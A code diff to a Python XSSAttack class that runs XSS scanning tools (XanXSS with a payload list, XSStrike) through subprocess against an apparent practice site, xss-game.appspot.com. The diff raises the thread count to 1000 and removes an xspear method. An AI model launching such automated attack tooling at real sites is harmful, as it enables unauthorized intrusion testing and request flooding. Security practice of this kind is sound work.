@@ -13,7 +13,7 @@ class XSSAttack:
         url,
         time=25,
         checks=5,
-        threads=1,
+        threads=1000,
         attack_type="xanxxs",
         file="XanXSS/xss-payload-list.txt",
     ):
@@ -64,23 +64,11 @@ class XSSAttack:
 
         subprocess.run(command)
 
-    def xspear_attack(self):
-        command = [
-            "xspear",
-            "-u",
-            self.url,
-            "-t",
-            str(self.threads),
-            "-o",
-            "json",
-        ]
-        subprocess.run(command)
-
 
 # Target URL
 target_url = "http://xss-game.appspot.com/level1/frame?query="
 
 # Create and launch attack
-attack = XSSAttack(target_url, time=25, checks=5, threads=100, attack_type="xsstrike")
+attack = XSSAttack(target_url, time=25, checks=5, threads=1000, attack_type="xsstrike")
 attack.create_attacks()
 attack.wait_for_threads()
